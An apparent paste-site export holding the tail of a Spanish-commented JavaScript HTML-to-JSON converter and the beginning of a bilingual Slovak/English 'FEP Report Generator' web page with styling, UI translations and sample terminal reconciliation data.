			if (elementLevel1.children.length > 0) {
						
				// Notificación en la consola sobre la cantidad de elementos de nivel 2 encontrados dentro del elemento de nivel 1
				console.log('		El elemento <' + elementLevel1Name + '> tiene ' + elementLevel1.children.length + ' elementos anidados.');
						
				// Declaración de un array para el registro estructurado del contenido del elemento de nivel 1
				// (elementos de nivel 2)
				let elementLevel1Content = new Array();
						
				// Recorrido de los elementos de nivel 2, si se encuentran				
				for (let e2 = 0; e2 < elementLevel1.children.length; e2++) {
										
					let elementLevel2 = elementLevel1.children[e2]; // Selección del elemento de nivel 2
							
					// Declaración de un array para el registro estructurado del elemento actual de nivel 2
					let thisInnerContentLevel2 = new Array();
							
					// Registro del nombre del elemento de nivel 2
					let elementLevel2Name = elementLevel2.tagName; // Selección del nombre del elemento de nivel 2
					console.log('			ENCONTRADO ELEMENTO DE NIVEL 2 <' + elementLevel2Name + '>'); // Notificación sobre el elemento de nivel 2 encontrado
														
					// Registro del nombre estructurado del elemento de nivel 2
					let elementLevel2NameSaver = {
						['element' + e2 + 'Level2Name']: elementLevel2Name
					};
					thisInnerContentLevel2.push(elementLevel2NameSaver);
										
					// Registro de los atributos del elemento de nivel 2
							
						// Verificación del elemento de nivel 2 para la presencia de atributos
						if (elementLevel2.attributes.length > 0) {
									
							// Si se encontraron atributos del elemento de nivel 2
							let elementLevel2Attributes = elementLevel2.attributes; // Selección de los atributos del elemento de nivel 2
									
							// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 2
							let saveAttributes2 = new Array();
									
							// Recorrido y registro de los atributos del elemento de nivel 2
							for (let a2 = 0; a2 < elementLevel2Attributes.length; a2++) {
								// Notificación sobre el atributo encontrado del elemento de nivel 2
								console.log('				Atributo del elemento de nivel 2: <' + elementLevel2.tagName + '>: ' + elementLevel2Attributes[a2].name + '=' + elementLevel2Attributes[a2].value);
										
								let attributeName2 = elementLevel2Attributes[a2].name; // Registro del nombre del atributo del elemento de nivel 2
								let attributeValue2 = elementLevel2Attributes[a2].value; // Registro del valor del atributo del elemento de nivel 2
										
								// Registro del nombre y valor del atributo actual del elemento de nivel 2 en el objeto
								let currentAttribute2 = {
									['element' + e2 + 'Level2' + 'attribute' + a2]: [
										{
											['element' + e2 + 'Level2' + 'attribute' + a2 + 'Name']: attributeName2
										},
										{
											['element' + e2 + 'Level2' + 'attribute' + a2 + 'Value']: attributeValue2
										}
									]
								};
										
								// Guardar el atributo estructurado del elemento de nivel 2 en el array
								saveAttributes2.push(currentAttribute2);

							};
									
							// Registro de los atributos estructurados del elemento de nivel 2 desde el array de atributos del elemento de nivel 2 (saveAttributes2)
							// en el array de contenido del elemento de nivel 1 (elemenLevel1Content)
							// usando un objeto intermedio elementLevel2AttributesSaver
							let elementLevel2AttributesSaver = {
								['element' + e2 + 'Level2Attributes']: saveAttributes2
							};
							thisInnerContentLevel2.push(elementLevel2AttributesSaver);
													
						} else {
									
							// Si el elemento de nivel 2 no tiene atributos, mostrar notificación en la consola
							console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no tiene atributos.');
									
							// Si el elemento de nivel 2 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
							let elementLevel2AttributesSaver = {
								['element' + e2 + 'Level2Attributes']: ''
							};
							thisInnerContentLevel2.push(elementLevel2AttributesSaver);

						};
								
									
					// Registro del contenido del elemento de nivel 2 (otros elementos o texto)
										
						// Verificación del elemento de nivel 2 para la presencia de elementos anidados
						if (elementLevel2.children.length > 0) {
											
							// Notificación en la consola sobre la cantidad de elementos de nivel 3 encontrados dentro del elemento de nivel 2
							console.log('				El elemento <' + elementLevel2Name + '> tiene ' + elementLevel2.children.length + ' elementos anidados.');
											
							// Declaración de un array para el registro estructurado del contenido del elemento de nivel 2
							// (elementos de nivel 3)
							let elementLevel2Content = new Array();
											
							// Recorrido de los elementos de nivel 3, si se encuentran
							for (let e3 = 0; e3 < elementLevel2.children.length; e3++) {
												
								let elementLevel3 = elementLevel2.children[e3]; // Selección del elemento de nivel 3
												
								// Declaración de un array para el registro estructurado del elemento actual de nivel 3
								let thisInnerContentLevel3 = new Array();
												
								// Registro del nombre del elemento de nivel 3
								let elementLevel3Name = elementLevel3.tagName; // Selección del nombre del elemento de nivel 3
								console.log('					ENCONTRADO ELEMENTO DE NIVEL 3 <' + elementLevel3Name + '>'); // Notificación sobre el elemento de nivel 3 encontrado
												
								// Registro del nombre estructurado del elemento de nivel 3
								let elementLevel3NameSaver = {
									['element' + e3 + 'Level3Name']: elementLevel3Name
								};
								thisInnerContentLevel3.push(elementLevel3NameSaver);
											
								// Registro de los atributos del elemento de nivel 3
											
									// Verificación del elemento de nivel 3 para la presencia de atributos
									if (elementLevel3.attributes.length > 0) {
													
										// Si se encontraron atributos del elemento de nivel 3
										let elementLevel3Attributes = elementLevel3.attributes; // Selección de los atributos del elemento de nivel 3
														
										// Declaración de un array para el registro estructurado de los atributos del elemento de nivel 3
										let saveAttributes3 = new Array();
														
										// Recorrido y registro de los atributos del elemento de nivel 3
										for (let a3 = 0; a3 < elementLevel3Attributes.length; a3++) {
											
											// Notificación sobre el atributo encontrado del elemento de nivel 3
											console.log('						Atributo del elemento de nivel 3: <' + elementLevel3.tagName + '>: ' + elementLevel3Attributes[a3].name + '=' + elementLevel3Attributes[a3].value);
															
											let attributeName3 = elementLevel3Attributes[a3].name; // Registro del nombre del atributo del elemento de nivel 3
											let attributeValue3 = elementLevel3Attributes[a3].value; // Registro del valor del atributo del elemento de nivel 3
															
											// Registro del nombre y valor del atributo actual del elemento de nivel 3 en el objeto
											let currentAttribute3 = {
												['element' + e3 + 'Level3' + 'attribute' + a3]: [
													{
														['element' + e3 + 'Level3' + 'attribute' + a3 + 'Name']: attributeName3
													},
													{
														['element' + e3 + 'Level3' + 'attribute' + a3 + 'Value']: attributeValue3
													}
												]
											};
															
											// Guardar el atributo estructurado del elemento de nivel 3 en el array
											saveAttributes3.push(currentAttribute3);

										};
													
										// Registro de los atributos estructurados del elemento de nivel 3 desde el array de atributos del elemento de nivel 3 (saveAttributes3)
										// en el array del elemento de nivel 3 (thisInnerContentLevel3)
										// usando un objeto intermedio elementLevel3AttributesSaver
										let elementLevel3AttributesSaver = {
											['element' + e3 + 'Level3Attributes']: saveAttributes3
										};
										thisInnerContentLevel3.push(elementLevel3AttributesSaver);
												
									}  else {
									
										// Si el elemento de nivel 3 no tiene atributos, mostrar notificación en la consola
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> no tiene atributos.');
												
										// Si el elemento de nivel 3 no tiene atributos, el objeto con espacio para ellos se deja con valor vacío
										let elementLevel3AttributesSaver = {
											['element' + e3 + 'Level3Attributes']: ''
										};
										thisInnerContentLevel3.push(elementLevel3AttributesSaver);

									};
									
								// Registro de cualquier contenido HTML del elemento de nivel 3
								
									// Verificación del elemento de nivel 3 para la presencia de cualquier contenido HTML
									if (elementLevel3.innerHTML) {
										
										let elementLevel3innerHTML = elementLevel3.innerHTML;
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> contiene contenido: ""' + elementLevel3innerHTML + '""');
										
										elementLevel3innerHTMLSaver = {
											['element' + e3 + 'Level3Content']: elementLevel3innerHTML
										};
										thisInnerContentLevel3.push(elementLevel3innerHTMLSaver);
										
									} else {
										console.log('						El elemento de nivel 3 <' + elementLevel3Name + '> no contiene contenido.');
										
										// Si el elemento de nivel 3 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
										let elementLevel3EmptyContentSaver = {
											['element' + e3 + 'Level3Content']: ''
										};
										thisInnerContentLevel3.push(elementLevel3EmptyContentSaver);
										
									};
									
								// Registro del elemento anidado actual de nivel 3 en un objeto intermedio
								// (contiene un objeto con número de orden y un valor-array de tres objetos:
								// nombre, atributos, contenido del elemento de nivel 3)
								let elementLevel3Saver = {
									['element' + e3 + 'Level3']: thisInnerContentLevel3
								};
												
								// Registro del objeto intermedio con el elemento anidado de nivel 3 en el array de contenido del elemento de nivel 2
								elementLevel2Content.push(elementLevel3Saver);
									
							}; // Fin del ciclo for para recorrer elementos de nivel 3, si se encontraron
							
							// Registro del array de todo el contenido del elemento de nivel 2 (elementos de nivel 3)
							// en un objeto intermedio (contiene el número de orden del elemento de nivel 2 al que pertenece el contenido,
							// y un valor-array del contenido actual del elemento de nivel 2 seleccionado
							let elementLevel2ContentSaver = {
								['element' + e2 + 'Level2Content']: elementLevel2Content
							};
							// Registro del objeto intermedio de todo el contenido estructurado del elemento de nivel 2
							// en el array del elemento de nivel 2
							thisInnerContentLevel2.push(elementLevel2ContentSaver);
							
						
						// Fin de la verificación de elementos de nivel 2 para la presencia de elementos anidados de nivel 3
						
						// Verificación de elementos de nivel 2 para la presencia de texto o ausencia de anidaciones
						} else if (elementLevel2.children.length == 0) {
										
							// Verificación del elemento de nivel 2 para la presencia de texto, si no hay elementos anidados
							console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no tiene elementos anidados. Búsqueda de texto.');
											
							if (elementLevel2.textContent) {
								let elementLevel2Text = elementLevel2.textContent; // Selección del contenido de texto dentro del elemento de nivel 2
								console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> contiene texto: ""' + elementLevel2Text + '""');
												
								// Registro del texto del elemento de nivel 2
								let elementLevel2TextSaver = {
									['element' + e2 + 'Level2Content']: elementLevel2Text
								};
								thisInnerContentLevel2.push(elementLevel2TextSaver);
												
							} else {
												
								// Si el elemento de nivel 2 no contiene ni elementos anidados ni texto
								console.log('				El elemento de nivel 2 <' + elementLevel2Name + '> no contiene texto.');
												
								// Si el elemento de nivel 2 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
								let elementLevel2EmptyContentSaver = {
									['element' + e2 + 'Level2Content']: ''
								};
								thisInnerContentLevel2.push(elementLevel2EmptyContentSaver);
												
							};
						
						};
						
						// Registro de todos los elementos anidados de nivel 2 en un objeto intermedio
						let elementLevel2Saver = {
							['element' + e2 + 'Level2']: thisInnerContentLevel2
						};
									
						// Registro del objeto intermedio con los elementos anidados de nivel 2 en el array de contenido del elemento de nivel 1
						elementLevel1Content.push(elementLevel2Saver);
						
				}; // Fin del ciclo for para recorrer elementos de nivel 2, si se encontraron
							
				// Registro del contenido estructurado del elemento de nivel 1 desde el array en el objeto raíz objectToStringify
				objectToStringify['element' + e + 'Level1'][2] = {
					['element' + e + 'Level1Content']: elementLevel1Content
				};
					
			} else if (elementLevel1.children.length == 0) {
					
				// Verificación del elemento de nivel 1 para la presencia de texto, si no hay elementos anidados
				console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no tiene elementos anidados. Búsqueda de texto.');
					
				if (elementLevel1.textContent) {
					let elementLevel1Text = elementLevel1.textContent; // Selección del contenido de texto dentro del elemento de nivel 1
					console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> contiene texto: ""' + elementLevel1Text + '""');
						
					// Registro del texto del elemento de nivel 1 en el objeto raíz objectToStringify
					objectToStringify['element' + e + 'Level1'][2] = {
						['element' + e + 'Level1Content']: elementLevel1Text
					};
						
				} else {
						
					// Si el elemento de nivel 1 no contiene ni elementos anidados ni texto
					console.log('		El elemento de nivel 1 <' + elementLevel1Name + '> no contiene texto.');
							
					// Si el elemento de nivel 1 no tiene contenido, el objeto con espacio para el contenido se deja con valor vacío
					objectToStringify['element' + e + 'Level1'][2] = {
						['element' + e + 'Level1Content']: ''
					};
				};
				
			};
	};
				
	// Mostrar el resultado de la conversión de HTML a JSON
	let result = JSON.stringify(objectToStringify); // Serializamos el objeto
	document.body.innerHTML = result; // Reemplazamos el cuerpo de la página con nuestro JSON
	// Agregar un separador antes de la notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('____________________________________________________________________________________________________');
	// Notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('SERIALIZACIÓN DEL CÓDIGO HTML COMPLETADA.');
};
		
setTimeout(convertHTMLtoJSON, 1000); // Mostramos el resultado un segundo después de cargar la página inicial

/*
function convertJSONtoHTML() {
	// Limpieza de la consola para repetir el lanzamiento del ejemplo
	console.clear();
	// Mostrar en la consola el nombre del programa
	console.log('= CONVERTIDOR JSON A HTML =');
	// Notificación en la consola sobre el inicio del trabajo del convertidor
	console.log('	INICIADA LA INTENTA DE DESERIALIZACIÓN DEL CÓDIGO HTML.');
	// Agregar un separador después de mostrar la información principal en la consola
	console.log('____________________________________________________________________________________________________');
	
	// Selección de la cadena JSON para su conversión posterior
	let JSONString = document.body.innerHTML;
	
	// Notificación en la consola sobre la cadena JSON encontrada
	console.log('		ENCONTRADA CADENA JSON:');
	console.log(JSONString);
	console.log('			Tipo de datos recibidos: ' + typeof JSONString);
	
	// Si el resultado de la verificación es una cadena (como se planeó)
	if (typeof JSONString === 'string') {
	
		console.log('		CONVERSIÓN DE CADENA JSON A OBJETO'); // Notificación en la consola sobre el inicio real de la conversión
		let JSONtoObject = JSON.parse(JSONString); // Conversión de la cadena JSON a objeto
		
		// Notificaciones en la consola sobre el resultado de la conversión de la cadena JSON a objeto JavaScript
		console.log('			Resultado de la conversión:');
		console.log(JSONtoObject);
		console.log('			Tipo después de la conversión: ' + typeof JSONtoObject);
		console.log('			Longitud del objeto (cantidad de elementos de nivel 1): ' + Object.keys(JSONtoObject).length);
		
		// Agregar un separador en la consola antes de comenzar el recorrido de los elementos encontrados
		console.log('____________________________________________________________________________________________________');
			
		// Recorrer todos los elementos HTML serializados de nivel 1
		for (let e = 0; e < Object.keys(JSONtoObject).length; e++) {
			
			// Selección del elemento de nivel 1 (par ""clave: valor"" del nivel superior)
			let elementLevel1 = Object.values(JSONtoObject)[e];
			// console.log(typeof elementLevel1);
			
			// Registro del nombre del elemento de nivel 1
			let elementLevel1Name = Object.values(elementLevel1[0]); // Selección del nombre del elemento de nivel 1
			console.log('		ENCONTRADO ELEMENTO DE NIVEL 1 <' + elementLevel1Name + '>'); // Notificación sobre el elemento de nivel 1 encontrado
			
			// Registro de los atributos del elemento de nivel 1
			let elementLevel1Attributes = Object.values(Object.values(elementLevel1[1])[0]); // Selección de los atributos del elemento de nivel 1 (o el espacio donde podrían estar, si no los hay)
			console.log('			En el elemento de nivel 1 <' + elementLevel1Name + '> se encontraron ' + elementLevel1Attributes.length + ' atributos.');
				
				// Recorrido y registro en el objeto raíz objectToStringify de los atributos del elemento de nivel 1
				for (let a = 0; a < elementLevel1Attributes.length; a++) {
					
					// Notificación sobre el atributo encontrado del elemento de nivel 1
					let currentAttributeA = Object.values(elementLevel1Attributes)[a]; // Selección del array del atributo actual del elemento de nivel 1
					console.log(currentAttributeA);
						
					let attributeName = Object.values(currentAttributeA)[0]; // Registro del nombre del atributo del elemento de nivel 1
					console.log(attributeName);
					// let attributeValue = elementLevel1Attributes[a].value; // Registro del valor del atributo del elemento de nivel 1
					
					// console.log('		Atributo del elemento de nivel 1 <' + elementLevel1Name + '>: ' + elementLevel1Attributes[a].name + '=' + elementLevel1Attributes[a].value);
				
				};
		};
	
	};
	
	// Agregar un separador antes de la notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('____________________________________________________________________________________________________');
	// Notificación en la consola sobre la finalización del trabajo del convertidor
	console.log('DESERIALIZACIÓN DEL CÓDIGO HTML COMPLETADA.');
};
setTimeout(convertJSONtoHTML, 1500); // Mostramos el resultado de la conversión inversa
*/"
AE7s5d0E,Untitled,1294hwy,Email,Saturday 14th of June 2025 02:43:14 PM CDT,1294hwy@gmail.com
GpcYk224,FRG.html,pfodo,HTML,Saturday 14th of June 2025 02:13:48 PM CDT,"<!DOCTYPE html>
<html lang=""sk"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>FEP Report Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 20px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        /* Language switch */
        .language-switch {
            text-align: center;
            margin-bottom: 30px;
        }
        .language-switch button {
            padding: 8px 16px;
            margin: 0 5px;
            background: #f0f0f0;
            border: 1px solid #ddd;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .language-switch button.active {
            background: #4CAF50;
            color: white;
            border-color: #4CAF50;
        }
        
        textarea {
            width: 100%;
            height: 250px;
            margin: 10px 0;
            font-family: 'Courier New', Courier, monospace;
            border: 2px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            font-size: 13px;
            resize: vertical;
            box-sizing: border-box;
        }
        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }
        
        /* Button styling */
        button {
            padding: 10px 15px;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 4px;
            font-size: 13px;
            transition: all 0.3s ease;
            margin: 2px;
        }
        button:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        button:active {
            transform: translateY(0);
        }
        
        /* Button colors */
        .process-btn {
            background-color: #4CAF50;
            font-weight: bold;
            font-size: 14px;
            padding: 12px 20px;
        }
        .input-btn {
            background-color: #2196F3;
        }
        .clear-btn {
            background-color: #FF9800;
        }
        .reset-btn {
            background-color: #f44336;
        }
        .output-btn {
            background-color: #9C27B0;
        }
        
        /* Button row layouts */
        .button-row {
            margin: 15px 0;
            padding: 15px;
            border-radius: 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            align-items: center;
        }
        
        /* Combined rows for desktop */
        .combined-row {
            justify-content: space-between;
            align-items: stretch;
        }
        
        .button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        
        .process-input-row {
            background: linear-gradient(90deg, #e8f5e8 0%, #e8f5e8 50%, #e3f2fd 50%, #e3f2fd 100%);
        }
        
        .clear-output-row {
            background: linear-gradient(90deg, #fff3e0 0%, #fff3e0 50%, #f3e5f5 50%, #f3e5f5 100%);
        }
        
        .row-label {
            font-weight: 600;
            color: #333;
            margin-right: 10px;
            min-width: 60px;
            font-size: 13px;
        }
        
        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .combined-row {
                flex-direction: column;
                background: #f8f8f8 !important;
            }
            
            .button-group {
                width: 100%;
                justify-content: center;
                padding: 10px;
                border-radius: 4px;
                margin: 5px 0;
            }
            
            .process-group {
                background-color: #e8f5e8;
            }
            
            .input-group {
                background-color: #e3f2fd;
            }
            
            .clear-group {
                background-color: #fff3e0;
            }
            
            .output-group {
                background-color: #f3e5f5;
            }
            
            button {
                flex: 1;
                min-width: 80px;
                max-width: calc(33.333% - 10px);
            }
            
            .process-btn {
                max-width: 100%;
            }
        }
        
        /* Desktop layout */
        @media (min-width: 769px) {
            .button-group {
                min-width: 45%;
            }
        }
        
        .output-section {
            margin-top: 20px;
        }
        
        #output, #scaledOutput {
            white-space: pre;
            background-color: #f8f8f8;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 10px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 13px;
            overflow-x: auto;
            min-height: 100px;
        }
        
        #scaledOutput {
            transform: scale(0.4);
            transform-origin: top left;
            width: 250%;
            margin-top: 20px;
            background-color: #fff;
        }
        
        .warning {
            color: #d32f2f;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            border-bottom: 2px solid #4CAF50;
            padding-bottom: 10px;
            text-align: center;
        }
        
        h3 {
            margin-top: 25px;
            color: #555;
        }
        
        .checkbox-container {
            margin: 15px 0;
            padding: 10px;
            background-color: #f0f0f0;
            border-radius: 4px;
        }
        .checkbox-container input[type=""checkbox""] {
            margin-right: 8px;
            transform: scale(1.2);
        }
        .checkbox-container label {
            font-weight: 500;
            color: #333;
        }
        
        #message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            font-weight: 500;
            min-height: 20px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .info {
            background-color: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
    </style>
</head>
<body>
    <div class=""container"">
        <h1 id=""title"">FEP Report Generator</h1>
        
        <!-- Language switch -->
        <div class=""language-switch"">
            <button onclick=""switchLanguage('sk')"" class=""active"" id=""lang-sk"">Slovenčina</button>
            <button onclick=""switchLanguage('en')"" id=""lang-en"">English</button>
        </div>
        
        <textarea id=""inputText"" placeholder=""""></textarea>
        
        <div class=""checkbox-container"">
            <input type=""checkbox"" id=""useCurrentDate"" name=""useCurrentDate"" checked>
            <label for=""useCurrentDate"" id=""currentDateLabel"">Použiť aktuálny dátum, ak chýba</label>
        </div>
        
        <!-- Process and Input combined row -->
        <div class=""button-row combined-row process-input-row"">
            <div class=""button-group process-group"">
                <button class=""process-btn"" onclick=""processText()"" id=""processBtn"">Spracovať</button>
            </div>
            <div class=""button-group input-group"">
                <span class=""row-label"" id=""inputLabel"">Vstup:</span>
                <button class=""input-btn"" onclick=""loadClipboard()"" id=""clipboardBtn"">Zo schránky</button>
                <button class=""input-btn"" onclick=""loadSampleData()"" id=""sampleBtn"">Vzorové dáta</button>
            </div>
        </div>
        
        <!-- Clear and Output combined row -->
        <div class=""button-row combined-row clear-output-row"">
            <div class=""button-group clear-group"">
                <span class=""row-label"" id=""clearLabel"">Vyčistiť:</span>
                <button class=""clear-btn"" onclick=""clearInput()"" id=""clearInputBtn"">Vstup</button>
                <button class=""reset-btn"" onclick=""resetOutput()"" id=""resetOutputBtn"">Výstup</button>
                <button class=""reset-btn"" onclick=""resetAll()"" id=""resetAllBtn"">Všetko</button>
            </div>
            <div class=""button-group output-group"">
                <span class=""row-label"" id=""outputLabel"">Výstup:</span>
                <button class=""output-btn"" onclick=""copyOutput()"" id=""copyBtn"">Skopírovať</button>
                <button class=""output-btn"" onclick=""showInNewWindow()"" id=""newWindowBtn"">Nové okno</button>
            </div>
        </div>
        
        <div class=""output-section"">
            <div id=""output""></div>
        </div>
        
        <h3 id=""scaledTitle"">Výstup v 40% veľkosti</h3>
        <div id=""scaledOutput""></div>
        
        <div id=""message""></div>
    </div>

    <script>
        // Language translations
        const translations = {
            sk: {
                title: ""FEP Report Generator"",
                inputPlaceholder: ""Vložte text alebo použite obsah schránky..."",
                currentDateLabel: ""Použiť aktuálny dátum, ak chýba"",
                processBtn: ""Spracovať"",
                inputLabel: ""Vstup:"",
                clipboardBtn: ""Zo schránky"",
                sampleBtn: ""Vzorové dáta"",
                clearLabel: ""Vyčistiť:"",
                clearInputBtn: ""Vstup"",
                resetOutputBtn: ""Výstup"",
                resetAllBtn: ""Všetko"",
                outputLabel: ""Výstup:"",
                copyBtn: ""Skopírovať"",
                newWindowBtn: ""Nové okno"",
                scaledTitle: ""Výstup v 40% veľkosti"",
                messages: {
                    clipboardSuccess: ""Úspešne načítané zo schránky"",
                    clipboardError: ""Nepodarilo sa načítať zo schránky. Skúste vložiť text manuálne."",
                    sampleLoaded: ""Vzorové dáta načítané"",
                    inputCleared: ""Vstup vyčistený"",
                    outputReset: ""Výstup bol vynulovaný"",
                    allReset: ""Vstup aj výstup boli vynulované"",
                    nothingToCopy: ""Žiadny výstup na skopírovanie"",
                    copySuccess: ""Výstup bol skopírovaný do schránky"",
                    copyError: ""Chyba pri kopírovaní. Skúste manuálne skopírovať text z výstupu."",
                    nothingToShow: ""Žiadny výstup na zobrazenie"",
                    noInput: ""Zadajte text na spracovanie"",
                    processSuccess: ""Text bol úspešne spracovaný"",
                    processError: ""Chyba pri spracovaní textu: ""
                }
            },
            en: {
                title: ""FEP Report Generator"",
                inputPlaceholder: ""Insert text or use clipboard content..."",
                currentDateLabel: ""Use current date if missing"",
                processBtn: ""Process"",
                inputLabel: ""Input:"",
                clipboardBtn: ""From clipboard"",
                sampleBtn: ""Sample data"",
                clearLabel: ""Clear:"",
                clearInputBtn: ""Input"",
                resetOutputBtn: ""Output"",
                resetAllBtn: ""All"",
                outputLabel: ""Output:"",
                copyBtn: ""Copy"",
                newWindowBtn: ""New window"",
                scaledTitle: ""Output at 40% size"",
                messages: {
                    clipboardSuccess: ""Successfully loaded from clipboard"",
                    clipboardError: ""Could not load from clipboard. Try pasting text manually."",
                    sampleLoaded: ""Sample data loaded"",
                    inputCleared: ""Input cleared"",
                    outputReset: ""Output has been reset"",
                    allReset: ""Input and output have been reset"",
                    nothingToCopy: ""No output to copy"",
                    copySuccess: ""Output has been copied to clipboard"",
                    copyError: ""Error copying. Try manually copying text from output."",
                    nothingToShow: ""No output to display"",
                    noInput: ""Enter text to process"",
                    processSuccess: ""Text has been processed successfully"",
                    processError: ""Error processing text: ""
                }
            }
        };

        let currentLang = 'sk';

        // Constants for processing
        const VIP_SITES = [""2325"", ""2526"", ""2546"", ""2550"", ""2553"", ""2557"", ""2558"", ""2561"", ""2562"", ""2574"", ""2676"", ""7901"", ""7902"", ""7905"", ""7906"", ""7907"", ""7457""];
        const PRIORITY_GROUPS = {
            'dealer': 1,
            'reconstruction': 2,
            'deviation': 3,
            'missing': 4
        };
        const GROUP_DESCRIPTIONS = {
            1: ""Dealer change"",
            2: ""Reconstruction"",
            3: ""No Data"",
            4: ""First message, no action"",
            5: """"
        };
        const SAMPLE_DATA = `automatic-mail-function Tandem Job-Start:April 17, 2025 2:26:19 Job:\\ZEUS.$DATB.OY.POSECKSA

POSECKSA            BEGINN:             2025041702261997

|OBN       |ShipTo  |Terminal|Type  |CType|CO/DO|Blocking reason          |Date     |Release |Term SW |Comment        |
|----------+--------+--------+------+-----+-----+-------------------------+---------+--------+--------+---------------|
|0000000209|10024190|70011937| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |1009    |               |
|0000000233|10024207|70012291| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |1009    |dealer change  |
|0000000294|10051370|70010425| BAS  |T&R  | CO  |reconciliation missing   |12Jun2025| 19.0   |1002    |               |
|0000000491|10024407|70012261| BAS  |RBA  | CO  |no reconciliation since  |11Jun2025| 1430   |1009    |               |
|0000000668|10024556|70010462| BAS  |RBA  | CO  |reconciliation deviation |         | 1430   |1009    |               |
|0000000867|10024696|70010939| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |5008    |               |
|0000001025|10024806|70010503| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1420   |5008    |reconstruction |
|0000001253|10024980|70015452| BAS  |T&R  | DO  |reconciliation deviation |         | 19.0   |1002    |               |
|0000001419|10025123|70010023| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |1009    |               |
|0000001419|10025123|70017083| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |1009    |               |
|0000002017|10025506|70014137| BAS  |RBA  | CO  |no reconciliation since  |11Jun2025| 1430   |1009    |               |
|0000002162|12141455|70018234| BAS  |RBA  | CO  |no reconciliation since  |11Jun2025| 1430   |5009    |               |
|0000002363|12587602|70025500| BAS  |MP   | DO  |reconciliation missing   |12Jun2025| 7420   |5009    |               |
|0000002551|12823297|70020161| BAS  |MP   | DO  |reconciliation missing   |12Jun2025| 7430   |5009    |               |
|0000002558|12823297|70020161| BAS  |MP   | DO  |reconciliation missing   |10Jun2025| 7430   |5009    |               |
|0000002840|13032070|70010034| BAS  |T&R  | CO  |reconciliation deviation |         | 19.0   |1002    |               |
|0000007427|10026711|70017149| BAS  |T&R  | CO  |no reconciliation since  |10Jun2025| 19.0   |1002    |               |
|0000007449|10026719|70013948| BAS  |RBA  | CO  |reconciliation missing   |12Jun2025| 1430   |1009    |               |
|0000007901|10026985|70028101| BAS  |CRID | CO  |no reconciliation since  |08May2025| 8430   |5008    |               |
|0000007901|10026985|70028102| BAS  |CRID | CO  |no reconciliation since  |08May2025| 8430   |5008    |               |
|0000009121|10027437|70019230| BAS  |RBA  | CO  |no reconciliation since  |11Jun2025| 1430   |5007    |               |
|0000009241|10027548|70012514| BAS  |RBA  | CO  |reconciliation deviation |         | 1430   |1009    |               |

POSECKSA            ENDE:               2024053102190359
--------
regards FEP-Support-Team
Please let us know, if this report is no longer used!`;

        // Language switching function
        function switchLanguage(lang) {
            currentLang = lang;
            const t = translations[lang];
            
            // Update UI elements
            document.getElementById('title').textContent = t.title;
            document.getElementById('inputText').placeholder = t.inputPlaceholder;
            document.getElementById('currentDateLabel').textContent = t.currentDateLabel;
            document.getElementById('processBtn').textContent = t.processBtn;
            document.getElementById('inputLabel').textContent = t.inputLabel;
            document.getElementById('clipboardBtn').textContent = t.clipboardBtn;
            document.getElementById('sampleBtn').textContent = t.sampleBtn;
            document.getElementById('clearLabel').textContent = t.clearLabel;
            document.getElementById('clearInputBtn').textContent = t.clearInputBtn;
            document.getElementById('resetOutputBtn').textContent = t.resetOutputBtn;
            document.getElementById('resetAllBtn').textContent = t.resetAllBtn;
            document.getElementById('outputLabel').textContent = t.outputLabel;
            document.getElementById('copyBtn').textContent = t.copyBtn;
            document.getElementById('newWindowBtn').textContent = t.newWindowBtn;
            document.getElementById('scaledTitle').textContent = t.scaledTitle;
            
            // Update language buttons
            document.getElementById('lang-sk').classList.toggle('active', lang === 'sk');
            document.getElementById('lang-en').classList.toggle('active', lang === 'en');
            
            // Update HTML lang attribute
            document.documentElement.lang = lang;
        }

        // Message display function
        function showMessage(messageKey, type = 'info') {
            const messageElement = document.getElementById('message');
            const message = translations[currentLang].messages[messageKey] || messageKey;
            messageElement.textContent = message;
            messageElement.className = type;
        }

        // Clipboard loading function
        async function loadClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('inputText').value = text;
                showMessage('clipboardSuccess', 'success');
            } catch (err) {
                showMessage('clipboardError', 'error');
            }
        }

        // Sample data loading function
        function loadSampleData() {
            document.getElementById('inputText').value = SAMPLE_DATA;
